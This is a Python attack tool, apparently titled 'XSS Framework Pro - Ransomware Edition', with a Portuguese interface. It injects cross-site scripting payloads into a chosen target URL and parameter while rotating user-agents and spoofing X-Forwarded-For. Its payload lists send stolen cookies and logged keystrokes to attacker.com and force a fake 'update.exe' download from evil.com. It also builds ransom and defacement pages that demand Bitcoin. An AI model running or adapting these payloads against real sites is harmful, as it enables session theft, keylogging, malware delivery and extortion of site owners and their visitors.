#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Framework Pro - Edição Ransomware
Autor: [Seu Nome]
Versão: 4.0
Descrição: Framework avançado para testes de vulnerabilidade XSS com recursos de ransomware web
"""

import requests
import sys
import urllib.parse
import base64
from time import sleep
from colorama import Fore, Style, init
import random
import json

# Inicializa colorama
init()

# Banner atualizado
BANNER = f"""
{Fore.RED}
 ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
 ╚██╗██╔╝╚══███╔╝╚══███╔╝    ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
  ╚███╔╝   ███╔╝   ███╔╝     ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
  ██╔██╗  ███╔╝   ███╔╝      ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
 ██╔╝ ██╗███████╗███████╗    ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
 ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
{Fore.YELLOW}
  XSS Framework Pro - Edição Ransomware | {Fore.CYAN}Web Crypto | Ataques Visuais{Style.RESET_ALL}
"""

# Categorias de payloads avançados
PAYLOAD_CATEGORIES = {
    '1': {
        'name': 'Testes Básicos',
        'payloads': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>"
        ]
    },
    '2': {
        'name': 'Sequestro de Sessão',
        'payloads': [
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
            "<img src=x onerror=\"fetch('https://attacker.com/log?data='+document.cookie)\">"
        ]
    },
    '3': {
        'name': 'Ransomware Web',
        'payloads': [
            """<script>
async function encryptData() {
  const key = await crypto.subtle.generateKey({name: "AES-GCM", length: 256}, true, ["encrypt"]);
  const data = new TextEncoder().encode(document.body.innerHTML);
  const encrypted = await crypto.subtle.encrypt({name: "AES-GCM", iv: window.crypto.getRandomValues(new Uint8Array(12))}, key, data);
  document.body.innerHTML = '<h1 style="color:red;">SEUS DADOS FORAM CIFRADOS! PAGUE 0.5 BTC PARA RECUPERAR</h1><p>Contato: ransom@evil.com</p>';
}
encryptData();
</script>""",
            """<script>
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:red;text-align:center;padding-top:100px">
  <h1>SEU SITE FOI HACKEADO!</h1>
  <img src="https://i.imgur.com/LJwvbq9.png" style="width:200px">
  <p>Para recuperar o acesso, envie 1 Bitcoin para: 1Hacker1EvilAddress</p>
</div>`;
</script>"""
        ]
    },
    '4': {
        'name': 'Ataque Visual Personalizado',
        'payloads': [
            """<script>
const imageUrl = 'YOUR_IMAGE_URL';
const message = 'YOUR_MESSAGE';
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#fff;text-align:center;padding-top:50px">
  <img src="${imageUrl}" style="max-width:80%;max-height:60vh">
  <h1 style="color:red;margin-top:30px">${message}</h1>
</div>`;
</script>"""
        ]
    },
    '5': {
        'name': 'Download Malicioso',
        'payloads': [
            """<script>
const link = document.createElement('a');
link.href = 'https://evil.com/malware.exe';
link.download = 'update.exe';
document.body.appendChild(link);
link.click();
</script>""",
            """<script>
setTimeout(() => {
  window.location.href = 'https://evil.com/fake_update.php';
}, 3000);
</script>"""
        ]
    },
    '6': {
        'name': 'Keylogging Avançado',
        'payloads': [
            """<script>
const keys = [];
document.onkeypress = function(e) {
  keys.push(e.key);
  if(keys.length % 10 == 0) {
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(keys)
    });
  }
}
</script>"""
        ]
    }
}

# Lista de user-agents para randomização
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

def print_banner():
    """Exibe o banner atualizado"""
    print(BANNER)

def show_main_menu():
    """Mostra o menu principal"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}XSS FRAMEWORK PRO - MENU PRINCIPAL{Fore.CYAN}       ║")
    print(f"╠════════════════════════════════════════════╣")
    print(f"║ {Fore.GREEN}1. {Fore.WHITE}Testar XSS em URL Específica{'':<15}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}2. {Fore.WHITE}Ataque Ransomware Web{'':<18}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}3. {Fore.WHITE}Ataque Visual Personalizado{'':<10}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}4. {Fore.WHITE}Download Forçado{'':<23}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}5. {Fore.WHITE}Keylogging Avançado{'':<18}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Sair{'':<33}{Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")

def show_payload_menu():
    """Mostra o menu de payloads"""
    print(f"\n{Fore.CYAN}╔════════════════════════════════════════════╗")
    print(f"║       {Fore.YELLOW}SELECIONE A CATEGORIA DE PAYLOAD{Fore.CYAN}       ║")
    print(f"╠════════════════════════════════════════════╣")
    for key in PAYLOAD_CATEGORIES:
        print(f"║ {Fore.GREEN}{key}. {Fore.WHITE}{PAYLOAD_CATEGORIES[key]['name']:<35}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}7.{Fore.WHITE} Custom Payload{'':<25}{Fore.CYAN}║")
    print(f"║ {Fore.GREEN}0. {Fore.WHITE}Voltar{'':<32}{Fore.CYAN}║")
    print(f"╚════════════════════════════════════════════╝{Style.RESET_ALL}")

def get_random_user_agent():
    """Retorna um user-agent aleatório"""
    return random.choice(USER_AGENTS)

def test_xss(url, param, payload, method='GET', data=None):
    """Testa um payload XSS específico"""
    try:
        headers = {
            'User-Agent': get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'X-Forwarded-For': f'127.0.0.{random.randint(1, 255)}'
        }
        
        if method.upper() == 'GET':
            params = {param: payload}
            response = requests.get(url, params=params, headers=headers, timeout=15)
        else:
            data = {param: payload} if data is None else data
            response = requests.post(url, data=data, headers=headers, timeout=15)
        
        if payload in response.text:
            return True, response.url
        return False, response.url
        
    except Exception as e:
        print(f"{Fore.RED}[!] Erro: {e}{Style.RESET_ALL}")
        return False, None

def create_custom_visual_attack():
    """Cria um ataque visual personalizado"""
    print(f"\n{Fore.YELLOW}[*] Criando Ataque Visual Personalizado{Style.RESET_ALL}")
    
    image_url = input(f"{Fore.CYAN}[?] URL da imagem (deixe vazio para pular): {Style.RESET_ALL}")
    message = input(f"{Fore.CYAN}[?] Mensagem a ser exibida: {Style.RESET_ALL}")
    bg_color = input(f"{Fore.CYAN}[?] Cor de fundo (ex: #000000): {Style.RESET_ALL}") or "#000"
    text_color = input(f"{Fore.CYAN}[?] Cor do texto (ex: #ff0000): {Style.RESET_ALL}") or "#f00"
    
    payload = f"""<script>
document.body.innerHTML = `
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:{bg_color};z-index:9999;color:{text_color};text-align:center;padding-top:50px">
  {f'<img src="{image_url}" style="max-width:80%;max-height:60vh;margin-bottom:20px">' if image_url else ''}
  <h1 style="font-size:2.5em;margin-bottom:20px">{message}</h1>
  <p style="font-size:1.5em">Seu site foi comprometido</p>
</div>`;
</script>"""
    
    return payload

def create_ransomware_payload():
    """Cria um payload de ransomware personalizado"""
    print(f"\n{Fore.YELLOW}[*] Criando Payload de Ransomware{Style.RESET_ALL}")
    
    bitcoin_address = input(f"{Fore.CYAN}[?] Endereço Bitcoin: {Style.RESET_ALL}") or "1Hacker1EvilAddress"
    email = input(f"{Fore.CYAN}[?] Email de contato: {Style.RESET_ALL}") or "ransom@evil.com"
    amount = input(f"{Fore.CYAN}[?] Valor do resgate: {Style.RESET_ALL}") or "0.5"
    
    payload = f"""<script>
async function encryptData() {{
  try {{
    const key = await crypto.subtle.generateKey({{name: "AES-GCM", length: 256}}, true, ["encrypt"]);
    const data = new TextEncoder().encode(document.body.innerHTML);
    const encrypted = await crypto.subtle.encrypt({{name: "AES-GCM", iv: window.crypto.getRandomValues(new Uint8Array(12))}}, key, data);
    
    document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#f00;text-align:center;padding-top:100px">
      <h1 style="font-size:3em">SEUS DADOS FORAM CIFRADOS!</h1>
      <p style="font-size:1.5em">Para recuperar o acesso, envie {amount} Bitcoin para:</p>
      <p style="font-size:1.8em;word-break:break-all">{bitcoin_address}</p>
      <p style="font-size:1.2em">Contato: {email}</p>
      <p style="font-size:0.8em;margin-top:50px">Todos os seus dados foram criptografados com AES-256</p>
    </div>`;
  }} catch(e) {{
    document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;color:#f00;text-align:center;padding-top:100px">
      <h1>SEU SITE FOI HACKEADO!</h1>
      <p>Para recuperar o acesso, envie {amount} Bitcoin para: {bitcoin_address}</p>
    </div>`;
  }}
}}
encryptData();
</script>"""
    
    return payload

def main():
    print_banner()
    
    if len(sys.argv) < 3:
        url = input(f"{Fore.CYAN}[?] Digite a URL alvo (ex: http://site.com/vulneravel.php): {Style.RESET_ALL}")
        param = input(f"{Fore.CYAN}[?] Digite o parâmetro a testar (ex: busca): {Style.RESET_ALL}")
    else:
        url = sys.argv[1]
        param = sys.argv[2]
    
    while True:
        show_main_menu()
        choice = input(f"\n{Fore.YELLOW}[?] Selecione uma opção (0-5): {Style.RESET_ALL}")
        
        if choice == '0':
            print(f"{Fore.YELLOW}[*] Saindo...{Style.RESET_ALL}")
            break
            
        elif choice == '1':
            show_payload_menu()
            payload_choice = input(f"\n{Fore.YELLOW}[?] Selecione uma categoria de payload (0-7): {Style.RESET_ALL}")
            
            if payload_choice == '0':
                continue
                
            elif payload_choice == '7':
                custom_payload = input(f"{Fore.CYAN}[?] Digite seu payload customizado: {Style.RESET_ALL}")
                vulnerable, target_url = test_xss(url, param, custom_payload)
                if vulnerable:
                    print(f"{Fore.GREEN}[+] VULNERÁVEL! Payload injetado com sucesso em: {target_url}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
            
            elif payload_choice in PAYLOAD_CATEGORIES:
                category = PAYLOAD_CATEGORIES[payload_choice]
                print(f"\n{Fore.CYAN}=== TESTANDO CATEGORIA: {category['name']} ==={Style.RESET_ALL}")
                
                for i, payload in enumerate(category['payloads'], 1):
                    print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
                    vulnerable, target_url = test_xss(url, param, payload)
                    
                    if vulnerable:
                        print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
                        print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                    sleep(0.2)
                    
                print(f"\n{Fore.YELLOW}[*] Teste da categoria {category['name']} concluído!{Style.RESET_ALL}")
            
            else:
                print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")
        
        elif choice == '2':
            payload = create_ransomware_payload()
            vulnerable, target_url = test_xss(url, param, payload)
            if vulnerable:
                print(f"{Fore.GREEN}[+] Payload de ransomware injetado com sucesso!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
        
        elif choice == '3':
            payload = create_custom_visual_attack()
            vulnerable, target_url = test_xss(url, param, payload)
            if vulnerable:
                print(f"{Fore.GREEN}[+] Ataque visual injetado com sucesso!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[-] Payload não refletido{Style.RESET_ALL}")
        
        elif choice == '4':
            category = PAYLOAD_CATEGORIES['5']
            print(f"\n{Fore.CYAN}=== TESTANDO DOWNLOADS MALICIOSOS ==={Style.RESET_ALL}")
            
            for i, payload in enumerate(category['payloads'], 1):
                print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
                vulnerable, target_url = test_xss(url, param, payload)
                
                if vulnerable:
                    print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                sleep(0.2)
        
        elif choice == '5':
            category = PAYLOAD_CATEGORIES['6']
            print(f"\n{Fore.CYAN}=== TESTANDO KEYLOGGING AVANÇADO ==={Style.RESET_ALL}")
            
            for i, payload in enumerate(category['payloads'], 1):
                print(f"{Fore.WHITE}[*] Testando payload {i}/{len(category['payloads'])}...{Style.RESET_ALL}", end='\r')
                vulnerable, target_url = test_xss(url, param, payload)
                
                if vulnerable:
                    print(f"\n{Fore.GREEN}[+] SUCESSO! {Fore.YELLOW}Payload: {payload}")
                    print(f"{Fore.GREEN}[+] URL: {target_url}{Style.RESET_ALL}")
                sleep(0.2)
        
        else:
            print(f"{Fore.RED}[!] Opção inválida!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
